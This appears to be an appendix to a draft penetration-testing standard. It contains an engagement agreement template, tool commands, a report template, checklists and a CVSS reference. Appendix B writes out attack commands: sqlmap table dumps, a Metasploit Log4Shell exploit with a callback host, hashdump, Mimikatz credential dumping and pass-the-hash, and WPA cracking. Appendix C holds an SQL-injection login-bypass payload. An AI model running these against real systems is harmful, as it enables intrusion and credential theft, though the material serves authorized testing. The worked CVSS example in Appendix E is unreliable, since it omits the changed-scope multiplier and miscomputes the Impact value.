# WIA-SEC-019: Penetration Testing - Appendix

**Version:** 1.0
**Status:** DRAFT
**Last Updated:** 2025-12-25
**Standard ID:** WIA-SEC-019

---

## Appendix A: Sample Penetration Testing Agreement

### A.1 Engagement Letter Template

```markdown
# PENETRATION TESTING SERVICES AGREEMENT

**Effective Date:** [Date]
**Client:** [Client Organization Name]
**Service Provider:** [Penetration Testing Firm]
**Engagement ID:** [Unique Engagement Identifier]

## 1. SCOPE OF SERVICES

The Service Provider agrees to perform penetration testing services on the following systems:

**In-Scope Targets:**
- IP Address Ranges: [e.g., 203.0.113.0/24]
- Domain Names: [e.g., *.example.com]
- Applications: [e.g., Customer Portal, API Gateway]
- Infrastructure: [e.g., AWS Account ID: 123456789012]

**Out-of-Scope:**
- [List excluded systems]
- [Third-party hosted services without authorization]
- [Production databases containing live customer data]

## 2. TESTING METHODOLOGY

The Service Provider will follow the WIA-SEC-019 standard, incorporating:
- PTES (Penetration Testing Execution Standard)
- OWASP Testing Guide
- MITRE ATT&CK Framework

## 3. RULES OF ENGAGEMENT

**Testing Window:**
- Start Date: [Date]
- End Date: [Date]
- Permitted Hours: [e.g., Monday-Friday, 09:00-17:00 UTC]

**Restrictions:**
- Denial of Service attacks: PROHIBITED
- Social Engineering: [Email phishing only / Phone calls allowed / Physical access allowed]
- Data Exfiltration: Simulation only, no actual data removal
- Destructive Actions: PROHIBITED without prior approval

**Emergency Stop:**
- Contact: [Name, Phone, Email]
- Procedure: [Stop all testing immediately and notify contact]

## 4. AUTHORIZATION

By signing below, the Client authorizes the Service Provider to conduct penetration testing as outlined in this agreement.

**Client Authorized Representative:**
Name: ________________________
Title: ________________________
Signature: ____________________
Date: ________________________

**Service Provider Representative:**
Name: ________________________
Title: ________________________
Signature: ____________________
Date: ________________________
```

---

## Appendix B: Sample Tools and Commands

### B.1 Network Reconnaissance

**Nmap - Network Scanning**
```bash
# TCP SYN scan (stealth scan)
nmap -sS -sV -O -p- -oA scan_results 192.168.1.0/24

# Vulnerability scanning with Nmap scripts
nmap --script=vuln -p 80,443 example.com

# Service version detection
nmap -sV -p 1-65535 --version-intensity 9 example.com
```

**Masscan - Fast Port Scanner**
```bash
# Scan entire IP range quickly
masscan -p 1-65535 203.0.113.0/24 --rate=10000 -oL masscan_results.txt
```

### B.2 Web Application Testing

**Burp Suite - Proxy and Scanner**
```bash
# Command-line scan (Burp Suite Enterprise)
burp-cli scan --url https://example.com --config-file config.json

# Export results
burp-cli export --format json --output burp_results.json
```

**OWASP ZAP - Web Application Scanner**
```bash
# Quick scan
zap-cli quick-scan --spider -r https://example.com

# Full scan with authentication
zap-cli active-scan --recursive -r https://example.com

# Generate report
zap-cli report -o zap_report.html -f html
```

**SQLMap - SQL Injection Testing**
```bash
# Basic SQL injection test
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Dump database tables
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# Extract data
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --dump

# Test POST parameters
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test" --risk=3 --level=5
```

### B.3 Exploitation Frameworks

**Metasploit Framework**
```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search cve:2021-44228

# Use specific exploit
msf6 > use exploit/multi/http/log4shell_header_injection
msf6 exploit(multi/http/log4shell_header_injection) > set RHOSTS example.com
msf6 exploit(multi/http/log4shell_header_injection) > set LHOST 192.168.1.100
msf6 exploit(multi/http/log4shell_header_injection) > run

# Post-exploitation: Privilege escalation
meterpreter > getsystem
meterpreter > hashdump
```

### B.4 Password Cracking

**Hashcat - Hash Cracking**
```bash
# Crack MD5 hashes
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Crack NTLM hashes (Windows)
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt

# Brute force attack
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
```

**John the Ripper - Password Cracker**
```bash
# Crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

### B.5 Wireless Security Testing

**Aircrack-ng - WiFi Security**
```bash
# Put wireless card in monitor mode
airmon-ng start wlan0

# Capture WPA handshake
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Crack WPA password
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture-01.cap
```

### B.6 Post-Exploitation Tools

**Mimikatz - Windows Credential Dumping**
```powershell
# Dump credentials from memory
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Extract Kerberos tickets
mimikatz # sekurlsa::tickets /export

# Pass-the-Hash attack
mimikatz # sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:hash
```

**BloodHound - Active Directory Analysis**
```bash
# Collect AD data
SharpHound.exe -c All -d domain.local

# Import and analyze in BloodHound GUI
```

---

## Appendix C: Vulnerability Report Templates

### C.1 Critical Vulnerability Report

```markdown
# CRITICAL VULNERABILITY REPORT

**Vulnerability ID:** VULN-2025-001
**Title:** SQL Injection in Login Form
**Severity:** CRITICAL
**CVSS Score:** 10.0
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

---

## Executive Summary

A critical SQL injection vulnerability was identified in the login form of the customer portal. This vulnerability allows unauthenticated attackers to:
- Bypass authentication controls
- Extract sensitive data from the database
- Modify or delete database records
- Potentially execute operating system commands

**Immediate Action Required:** Disable the vulnerable endpoint until remediation is complete.

---

## Technical Details

### Location
- **URL:** https://app.example.com/login.php
- **Parameter:** username
- **HTTP Method:** POST

### Vulnerability Description

The login form does not properly sanitize user input before constructing SQL queries. This allows attackers to inject malicious SQL code through the `username` parameter.

### Proof of Concept

**Request:**
```http
POST /login.php HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1' -- &password=irrelevant
```

**Response:**
```http
HTTP/1.1 302 Found
Location: /dashboard.php
Set-Cookie: session=abc123...
```

**Result:** Successfully bypassed authentication and gained access to admin dashboard.

### Impact Assessment

**Technical Impact:**
- Complete compromise of database integrity
- Unauthorized access to all user accounts
- Potential for remote code execution via SQL

**Business Impact:**
- Data breach affecting 500,000 customer records
- Compliance violations (GDPR, PCI DSS)
- Reputational damage
- Estimated financial impact: $5M - $10M

---

## Remediation Recommendations

### Immediate Actions (24-48 hours)
1. Disable the vulnerable login endpoint
2. Implement IP-based access restrictions to admin panel
3. Enable database query logging for forensic analysis

### Short-term Fixes (1 week)
1. Implement prepared statements/parameterized queries:
```php
// Vulnerable code
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// Secure code
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password_hash]);
```

2. Implement input validation and sanitization
3. Add Web Application Firewall (WAF) rules to block SQL injection patterns

### Long-term Improvements (1 month)
1. Conduct comprehensive code review of entire application
2. Implement secure coding training for development team
3. Integrate SAST tools into CI/CD pipeline
4. Deploy database activity monitoring

---

## Verification Steps

After remediation:
1. Retest with original PoC payload - should be blocked
2. Test with various SQL injection payloads from SQLMap
3. Verify WAF is logging and blocking malicious requests
4. Confirm prepared statements are used throughout codebase

---

## References

- OWASP Top 10 2021: A03 - Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- CAPEC-66: SQL Injection
- MITRE ATT&CK T1190: Exploit Public-Facing Application

---

**Reported By:** Jane Doe, Senior Penetration Tester
**Report Date:** 2025-01-20
**Client Notification:** 2025-01-20 (within 2 hours of discovery)
```

---

## Appendix D: Testing Checklists

### D.1 Web Application Testing Checklist

**Information Gathering:**
- [ ] Identify web server type and version
- [ ] Enumerate subdomains and virtual hosts
- [ ] Review robots.txt and sitemap.xml
- [ ] Identify web application frameworks and technologies
- [ ] Review client-side source code for sensitive information
- [ ] Search for backup files and old versions

**Authentication:**
- [ ] Test for default credentials
- [ ] Test password policy enforcement
- [ ] Test account lockout mechanism
- [ ] Test for username enumeration
- [ ] Test password reset functionality
- [ ] Test remember me functionality
- [ ] Test for session fixation
- [ ] Test logout functionality
- [ ] Test multi-factor authentication bypass

**Authorization:**
- [ ] Test for horizontal privilege escalation
- [ ] Test for vertical privilege escalation
- [ ] Test for insecure direct object references (IDOR)
- [ ] Test for missing function-level access control
- [ ] Test for forced browsing to admin pages

**Session Management:**
- [ ] Test cookie attributes (Secure, HttpOnly, SameSite)
- [ ] Test session timeout
- [ ] Test for session fixation
- [ ] Test for CSRF protection
- [ ] Test session token randomness

**Input Validation:**
- [ ] Test for SQL injection (all parameters)
- [ ] Test for Cross-Site Scripting (XSS)
- [ ] Test for XML injection
- [ ] Test for LDAP injection
- [ ] Test for OS command injection
- [ ] Test for path traversal
- [ ] Test for local file inclusion (LFI)
- [ ] Test for remote file inclusion (RFI)

**Business Logic:**
- [ ] Test for race conditions
- [ ] Test for price manipulation
- [ ] Test for quantity limits bypass
- [ ] Test for workflow bypass
- [ ] Test for business process abuse

**API Security:**
- [ ] Test for broken object level authorization
- [ ] Test for broken authentication
- [ ] Test for excessive data exposure
- [ ] Test for lack of rate limiting
- [ ] Test for mass assignment

### D.2 Network Penetration Testing Checklist

**External Testing:**
- [ ] Port scanning and service enumeration
- [ ] SSL/TLS configuration testing
- [ ] SMTP open relay testing
- [ ] DNS zone transfer attempts
- [ ] Banner grabbing
- [ ] Firewall rule testing
- [ ] VPN security assessment

**Internal Testing:**
- [ ] Network segmentation testing
- [ ] VLAN hopping attempts
- [ ] ARP spoofing/poisoning
- [ ] LLMNR/NBT-NS poisoning
- [ ] SMB relay attacks
- [ ] Kerberoasting
- [ ] Active Directory enumeration
- [ ] Privilege escalation testing
- [ ] Lateral movement

---

## Appendix E: CVSS Calculator Reference

### E.1 CVSS v3.1 Score Calculation

**Base Score Formula:**
```
If Impact <= 0:
  BaseScore = 0

If Scope is Unchanged:
  Impact = 6.42 × ISS

If Scope is Changed:
  Impact = 7.52 × (ISS - 0.029) - 3.25 × (ISS - 0.02)^15

BaseScore = Roundup(Minimum[(Impact + Exploitability), 10])

Where:
ISS = 1 - [(1 - Confidentiality) × (1 - Integrity) × (1 - Availability)]
Exploitability = 8.22 × AttackVector × AttackComplexity × PrivilegesRequired × UserInteraction
```

**Example Calculation:**

Vulnerability: Remote Code Execution
- Attack Vector: Network (0.85)
- Attack Complexity: Low (0.77)
- Privileges Required: None (0.85)
- User Interaction: None (0.85)
- Scope: Changed
- Confidentiality: High (0.56)
- Integrity: High (0.56)
- Availability: High (0.56)

```
ISS = 1 - [(1-0.56) × (1-0.56) × (1-0.56)] = 0.915
Impact = 7.52 × (0.915 - 0.029) - 3.25 × (0.915 - 0.02)^15 = 6.42
Exploitability = 8.22 × 0.85 × 0.77 × 0.85 × 0.85 = 3.89
BaseScore = Roundup(min(6.42 + 3.89, 10)) = 10.0 (CRITICAL)
```

---

## Appendix F: Legal and Compliance

### F.1 Legal Considerations

**Authorization Requirements:**
- Written authorization from system owner
- Clearly defined scope and boundaries
- Rules of engagement documentation
- Data handling and confidentiality agreements

**Computer Fraud and Abuse Act (CFAA) Compliance:**
- Only test systems you are authorized to access
- Stay within the defined scope
- Do not exceed authorized access
- Report findings responsibly

**Data Protection:**
- GDPR compliance for EU data subjects
- CCPA compliance for California residents
- HIPAA compliance for healthcare data
- PCI DSS compliance for payment card data

### F.2 Industry Standards Compliance

**PCI DSS Requirement 11.3:**
- Penetration testing at least annually
- After significant infrastructure changes
- Internal and external testing
- Application layer testing
- Network layer testing

**ISO 27001 Controls:**
- A.12.6.1: Management of technical vulnerabilities
- A.18.2.3: Technical compliance review

**NIST Cybersecurity Framework:**
- ID.RA-1: Asset vulnerabilities are identified
- DE.CM-4: Malicious code is detected
- RS.AN-5: Processes are established to receive, analyze, and respond to vulnerabilities

---

## Appendix G: Additional Resources

### G.1 Penetration Testing Frameworks

- **PTES** - Penetration Testing Execution Standard
  http://www.pentest-standard.org/

- **OWASP Testing Guide** - Web Application Security Testing
  https://owasp.org/www-project-web-security-testing-guide/

- **NIST SP 800-115** - Technical Guide to Information Security Testing
  https://csrc.nist.gov/publications/detail/sp/800-115/final

- **OSSTMM** - Open Source Security Testing Methodology Manual
  https://www.isecom.org/OSSTMM.3.pdf

### G.2 Vulnerability Databases

- **CVE** - Common Vulnerabilities and Exposures
  https://cve.mitre.org/

- **NVD** - National Vulnerability Database
  https://nvd.nist.gov/

- **Exploit-DB** - Exploit Database
  https://www.exploit-db.com/

- **CAPEC** - Common Attack Pattern Enumeration and Classification
  https://capec.mitre.org/

### G.3 Security Tools

**Reconnaissance:**
- Nmap, Masscan, Shodan, Censys, theHarvester

**Vulnerability Scanning:**
- Nessus, OpenVAS, Nexpose, Qualys

**Web Application Testing:**
- Burp Suite, OWASP ZAP, Nikto, WPScan

**Exploitation:**
- Metasploit Framework, ExploitDB, Cobalt Strike

**Post-Exploitation:**
- Mimikatz, BloodHound, PowerView, Empire

**Cloud Security:**
- ScoutSuite, Prowler, CloudSploit, Pacu

---

**弘益人間 (홍익인간) · Benefit All Humanity**

© 2025 SmileStory Inc. / WIA - World Certification Industry Association
